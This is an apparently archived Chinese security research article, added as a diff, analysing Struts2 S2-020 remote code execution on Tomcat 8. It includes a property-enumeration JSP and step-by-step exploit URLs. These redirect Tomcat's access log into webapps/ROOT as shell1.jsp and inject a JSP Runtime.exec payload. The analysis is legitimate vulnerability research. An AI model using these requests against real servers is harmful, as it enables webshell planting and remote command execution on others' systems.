@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Struts2 S2-020在Tomcat 8下的命令执行分析</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Struts2 S2-020在Tomcat 8下的命令执行分析</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200121759&amp;idx=1&amp;sn=368188e66957f76fea748cc4ed155537&amp;chksm=28f60f141f81860234d1095a0262ffd59be48aab98b2d3c3efd8d61996112be87e67d623b891&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200121759&amp;idx=1&amp;sn=368188e66957f76fea748cc4ed155537&amp;chksm=28f60f141f81860234d1095a0262ffd59be48aab98b2d3c3efd8d61996112be87e67d623b891&amp;scene=27#wechat_redirect</a></blockquote><p>作者 yiran4827</p><p><br/></p><p style=""><span style="margin: 0px; padding: 0px; color: rgb(38, 38, 38);"><strong style="margin: 0px; padding: 0px;">Struts S2-020<span style="margin: 0px; padding: 0px; font-family: 宋体;">这个通告已经公布有一段时间了。目前大家都知道这个漏洞可以造成</span>DOS<span style="margin: 0px; padding: 0px; font-family: 宋体;">、文件下载等危害，相信各大厂商也已经采取了相应的安全措施。</span></strong></span><span style="margin: 0px; padding: 0px; font-family: 宋体;">今天是和大家分享一下对这个漏洞的一点研究，包括如何在</span>Tomcat 8<span style="margin: 0px; padding: 0px; font-family: 宋体;">下导致</span>RCE<span style="margin: 0px; padding: 0px; font-family: 宋体;">，目的是抛砖引玉，有不足之处欢迎大家指出。</span><br style="margin: 0px; padding: 0px;"/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><h2 style=""><span style="margin: 0px; padding: 0px; font-family: 宋体; font-size: 20px; color: rgb(38, 38, 38);">1.属性列举</span><br style="margin: 0px; padding: 0px;"/></h2><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">这个漏洞分析的一个难点在于：通过</span>ognl<span style="margin: 0px; padding: 0px; font-family: 宋体;">的</span>class.xx<span style="margin: 0px; padding: 0px; font-family: 宋体;">这种方式来遍历属性时，得到的是实际运行环境中的动态</span>class<span style="margin: 0px; padding: 0px; font-family: 宋体;">，因此仅作静态分析是很困难的。例如</span>classLoader<span style="margin: 0px; padding: 0px; font-family: 宋体;">，在不同容器中就各不相同。于是我编写了一个小脚本来自动枚举这样的属性：（这段脚本只考虑了</span>int<span style="margin: 0px; padding: 0px; font-family: 宋体;">、</span>string<span style="margin: 0px; padding: 0px; font-family: 宋体;">与</span>boolean<span style="margin: 0px; padding: 0px; font-family: 宋体;">这些基本属性，未考虑数组等复杂的情况，实际情况下结果会更多）</span><br style="margin: 0px; padding: 0px;"/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-java prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">&lt;%@ page language="java" import="java.lang.reflect.*" %&gt;
+&lt;%!public void processClass(Object instance, javax.servlet.jsp.JspWriter out, java.util.HashSet set, String poc){
+	try {
+	    Class&lt;?&gt; c = instance.getClass();
+	    set.add(instance);
+	    Method[] allMethods = c.getMethods();
+	    for (Method m : allMethods) {
+		if (!m.getName().startsWith("set")) {
+		    continue;
+		}
+		if (!m.toGenericString().startsWith("public")) {
+		    continue;
+		}
+		Class&lt;?&gt;[] pType  = m.getParameterTypes();
+		if(pType.length!=1) continue;
+		
+		if(pType[0].getName().equals("java.lang.String")||
+		pType[0].getName().equals("boolean")||
+		pType[0].getName().equals("int")){
+			String fieldName = m.getName().substring(3,4).toLowerCase()+m.getName().substring(4);
+			out.print(poc+"."+fieldName + "&lt;br&gt;");
+		}
+	    }
+	    for (Method m : allMethods) {
+		if (!m.getName().startsWith("get")) {
+		    continue;
+		}
+		if (!m.toGenericString().startsWith("public")) {
+		    continue;
+		}		
+		Class&lt;?&gt;[] pType  = m.getParameterTypes();
+		if(pType.length!=0) continue;
+		if(m.getReturnType() == Void.TYPE) continue;
+		Object o = m.invoke(instance);
+		if(o!=null)
+		{
+			if(set.contains(o)) continue;
+			processClass(o,out, set, poc+"."+m.getName().substring(3,4).toLowerCase()+m.getName().substring(4));	
+		} 
+	    }
+	} catch (java.io.IOException x) {
+	    x.printStackTrace();
+	} catch (java.lang.IllegalAccessException x) {
+	    x.printStackTrace();
+	} catch (java.lang.reflect.InvocationTargetException x) {
+	    x.printStackTrace();
+	} 	
+}%&gt;
+&lt;%
+java.util.HashSet set = new java.util.HashSet&lt;Object&gt;();
+String poc = "class.classLoader";
+example.HelloWorld action = new example.HelloWorld();
+processClass(action.getClass().getClassLoader(),out,set,poc);
+%&gt;</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">在</span>tomcat 8.0.3<span style="margin: 0px; padding: 0px; font-family: 宋体;">下</span>Struts2.3.16<span style="margin: 0px; padding: 0px; font-family: 宋体;">的</span>blank app<span style="margin: 0px; padding: 0px; font-family: 宋体;">中执行这段</span>jsp<span style="margin: 0px; padding: 0px; font-family: 宋体;">，输出结果如下：</span><br style="margin: 0px; padding: 0px;"/><span style="margin: 0px; padding: 0px; font-family: 宋体;"/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-java prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">（省略部分非相关属性）
+class.classLoader.resources.context.parent.pipeline.first.encoding
+class.classLoader.resources.context.parent.pipeline.first.directory
+class.classLoader.resources.context.parent.pipeline.first.checkExists
+class.classLoader.resources.context.parent.pipeline.first.renameOnRotate
+class.classLoader.resources.context.parent.pipeline.first.fileDateFormat
+class.classLoader.resources.context.parent.pipeline.first.prefix
+class.classLoader.resources.context.parent.pipeline.first.rotatable
+class.classLoader.resources.context.parent.pipeline.first.buffered
+class.classLoader.resources.context.parent.pipeline.first.suffix
+class.classLoader.resources.context.parent.pipeline.first.locale
+class.classLoader.resources.context.parent.pipeline.first.requestAttributesEnabled
+class.classLoader.resources.context.parent.pipeline.first.enabled
+class.classLoader.resources.context.parent.pipeline.first.conditionUnless
+class.classLoader.resources.context.parent.pipeline.first.conditionIf
+class.classLoader.resources.context.parent.pipeline.first.pattern
+class.classLoader.resources.context.parent.pipeline.first.condition
+class.classLoader.resources.context.parent.pipeline.first.asyncSupported
+class.classLoader.resources.context.parent.pipeline.first.domain
+class.classLoader.resources.context.parent.pipeline.first.next.asyncSupported
+class.classLoader.resources.context.parent.pipeline.first.next.domain
+class.classLoader.resources.context.parent.pipeline.first.next.next.asyncSupported
+class.classLoader.resources.context.parent.pipeline.first.next.next.domain
+......</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">这意味着Tomcat 8下至少有</span>200<span style="margin: 0px; padding: 0px; font-family: 宋体;">多个</span>boolean、int<span style="margin: 0px; padding: 0px; font-family: 宋体;">或</span>string<span style="margin: 0px; padding: 0px; font-family: 宋体;">类型的属性是可以操纵的，虽然可修改不一定会产生危害，但至少说明这个漏洞的潜在风险不小。</span></p><h2 style=""><span style="margin: 0px; padding: 0px; color: rgb(38, 38, 38); font-size: 20px;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></strong></span></h2><h2 style=""><span style="margin: 0px; padding: 0px; color: rgb(38, 38, 38); font-size: 20px;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; font-family: 宋体;">2.POC</span></strong></span><br style="margin: 0px; padding: 0px;"/></h2><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">经过分析发现，通过下面的方法可以造成</span>webshell<span style="margin: 0px; padding: 0px; font-family: 宋体;">的效果，最终导致</span>Tomcat下<span style="margin: 0px; padding: 0px; font-family: 宋体;">的</span>RCE<span style="margin: 0px; padding: 0px; font-family: 宋体;">。</span><br style="margin: 0px; padding: 0px;"/><span style="margin: 0px; padding: 0px; font-family: 宋体;"/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">上面的属性中，有几个控制在</span>tomcat<span style="margin: 0px; padding: 0px; font-family: 宋体;">上生成的</span>access log<span style="margin: 0px; padding: 0px; font-family: 宋体;">的文件名，其默认值如下：</span><br style="margin: 0px; padding: 0px;"/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-java prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">class.classLoader.resources.context.parent.pipeline.first.directory =logs
+class.classLoader.resources.context.parent.pipeline.first.prefix =localhost_access_log
+class.classLoader.resources.context.parent.pipeline.first.suffix = .txt
+class.classLoader.resources.context.parent.pipeline.first.fileDateFormat =.yyyy-mm-dd</pre><p style=""> </p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">默认情况下，生成的</span>access log<span style="margin: 0px; padding: 0px; font-family: 宋体;">位于</span> logs<span style="margin: 0px; padding: 0px; font-family: 宋体;">目录（与</span>webapps<span style="margin: 0px; padding: 0px; font-family: 宋体;">平行）下，文件名是</span>localhost_access_log.2014-03-09.txt<span style="margin: 0px; padding: 0px; font-family: 宋体;">，但通过修改上面的属性值，可以导致在</span>webapps<span style="margin: 0px; padding: 0px; font-family: 宋体;">目录下写入</span>jspwebshell<span style="margin: 0px; padding: 0px; font-family: 宋体;">。</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">具体步骤如下（以</span>struts 2.3.16<span style="margin: 0px; padding: 0px; font-family: 宋体;">下的</span>blank app<span style="margin: 0px; padding: 0px; font-family: 宋体;">为例）：</span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">1.访问下面的</span>url<span style="margin: 0px; padding: 0px; font-family: 宋体;">来改变属性：</span><br/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+
+http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.prefix=shell
+
+http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">2.访问下面的url来触发tomcat切换log（这里有个坑，这个属性必须是数字,这里设定为1），那么从此开始tomcat的access log将被记录入 webapps/ROOT/shell1.jsp中：</span><br style="margin: 0px; padding: 0px;"/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">3.</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">通过发包访问下面的请求，在</span>access log<span style="margin: 0px; padding: 0px; font-family: 宋体;">中植入代码</span><br style="margin: 0px; padding: 0px;"/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">http://127.0.0.1/struts2-blank/example/aaaa.jsp?a=&lt;%Runtime.getRuntime().exec("calc");%&gt;</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">访问上述请求后，就可以看到生成了</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">webapps/ROOT/shell1.jsp</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，内容如下：</span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p><img data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR39CMoDKVq7SxkMib9tE9f8XCcN6ovtS4icqV4SyD3ylytxcx8WBWqdKo0strl152Wzv3Vu1MlpEPZXA/0" style="float:none;" src="../Images/058a16075928c5eb01cd9ffb8e0ca240.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR39CMoDKVq7SxkMib9tE9f8XCcN6ovtS4icqV4SyD3ylytxcx8WBWqdKo0strl152Wzv3Vu1MlpEPZXA/0"/></p><p><br/></p><p><span style="margin: 0px; padding: 0px; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;  background-color: rgb(255, 255, 255); font-family: 宋体;">4.结合前面设定的参数，访问下面的</span><span style="">url</span><span style="margin: 0px; padding: 0px; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;  background-color: rgb(255, 255, 255); font-family: 宋体;">，观察</span><span style="">shell</span><span style="margin: 0px; padding: 0px; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;  background-color: rgb(255, 255, 255); font-family: 宋体;">执行</span><span style=""><strong style="margin: 0px; padding: 0px;">http://127.0.0.1/shell1.jsp</strong></span></p><p><br/></p><p><img data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR39CMoDKVq7SxkMib9tE9f8XCiaGPBc6z9df3v4AIxcVjjlvcSUvoSkibh8mz5KOz1ibsZXZhSsXNLExAw/0" style="float:none;" src="../Images/08894bdac888126b5ca4a04e6fa8e03f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR39CMoDKVq7SxkMib9tE9f8XCiaGPBc6z9df3v4AIxcVjjlvcSUvoSkibh8mz5KOz1ibsZXZhSsXNLExAw/0"/></p><p><br/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">通过分析，上面的</span>POC<span style="margin: 0px; padding: 0px; font-family: 宋体;">中</span>class.classLoader.resources.context.parent.pipeline.first<span style="margin: 0px; padding: 0px; font-family: 宋体;">这个属性实际是</span>org.apache.catalina.valves.AccessLogValve，<span style="margin: 0px; padding: 0px; font-family: 宋体;">在</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">conf/server.xml</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">里面有一段相关的配置：</span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-xml prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">&lt;!-- Access log processes allexample.
+    Documentation at:/docs/config/valve.html
+    Note: The pattern used isequivalent to using pattern="common" --&gt;
+&lt;ValveclassName="org.apache.catalina.valves.AccessLogValve"directory="logs"
+prefix="localhost_access_log" suffix=".txt"
+pattern="%h %l %u %t&amp;quot;%r&amp;quot; %s %b" /&gt;</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">为何修改了</span>dataformat<span style="margin: 0px; padding: 0px; font-family: 宋体;">会触发切换日志呢？注意下面一个属性，默认是</span>true</p><p style=""><br/></p><pre class="prettyprint lang-java prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;"> .class.classLoader.resources.context.parent.pipeline.first.rotatable</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">每次</span>Log<span style="margin: 0px; padding: 0px; font-family: 宋体;">时，都会调用</span>rotate:<br style="margin: 0px; padding: 0px;"/></p><p style=""><br/></p><pre class="prettyprint lang-java prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">publicvoid log(CharArrayWriter message)  {rotate();…</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">而</span>rotate<span style="margin: 0px; padding: 0px; font-family: 宋体;">是检查当前的</span>systime <span style="margin: 0px; padding: 0px; font-family: 宋体;">经过</span>format<span style="margin: 0px; padding: 0px; font-family: 宋体;">后，与当前的</span>tsDate<span style="margin: 0px; padding: 0px; font-family: 宋体;">是否相同。如果日期不同了，自然需要切换日志文件了：</span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><pre class="prettyprint lang-java prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">public void rotate(){
+    if (this.rotatable){
+        long systime =System.currentTimeMillis();
+        if (systime - this.rotationLastChecked&gt; 1000L)
+            synchronized (this){
+                if (systime -this.rotationLastChecked &gt; 1000L){
+                    this.rotationLastChecked = systime; 
+                String tsDate =this.fileDateFormatter.format(new Date(systime)); 
+                if (!this.dateStamp.equals(tsDate)){
+                    close(true);
+                    this.dateStamp = tsDate;
+                    open();
+                }
+            }
+        }
+    }
+}</pre><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;">而我们之前已经修改了</span>dateFormat<span style="margin: 0px; padding: 0px; font-family: 宋体;">，所以就触发了日志切换。</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">这个特性与具体的OS无关，是tomcat代码决定的。在linux与windows下证实该问题均存在。</span></p><h3 style=""><span style="margin: 0px; padding: 0px; color: rgb(38, 38, 38); font-size: 20px;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; font-family: 宋体;"><br/></span></strong></span></h3><h3 style=""><span style="margin: 0px; padding: 0px; color: rgb(38, 38, 38); font-size: 20px;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; font-family: 宋体;">3.后记</span></strong></span><br style="margin: 0px; padding: 0px;"/></h3><p style=""><br/></p><p style=""><span style="margin: 0px; padding: 0px; font-family: 宋体;"/>这个POC距离实际的攻击还有一定的距离，发表此文仅供技术研究使用，请勿用于实际攻击。另外，也许还有其他的利用方式，Tomcat 8下那么多的可操控的属性，或许有别的也可以RCE？其他的容器下，是否也有这么多的可操控属性呢？欢迎感兴趣的同学与我们BSRC的同学讨论。</p><p style=""><br/></p><p style="">[via sec.baidu.com 作者：<span style="margin: 0px; padding: 0px; color: rgb(38, 38, 38);"><strong style="margin: 0px; padding: 0px;">neobyte</strong></span>]</p><p style=""><img data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR39CMoDKVq7SxkMib9tE9f8XCgrTNIMXHHofyiaAahF0cDDkJ6toNE6SDA6icpHNXPGlFtoEViaD785Rww/0" src="../Images/a3d536365bcac16c9de700346703f5be.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR39CMoDKVq7SxkMib9tE9f8XCgrTNIMXHHofyiaAahF0cDDkJ6toNE6SDA6icpHNXPGlFtoEViaD785Rww/0"/></p><p><br/></p>
+        
+</body>
+</html>
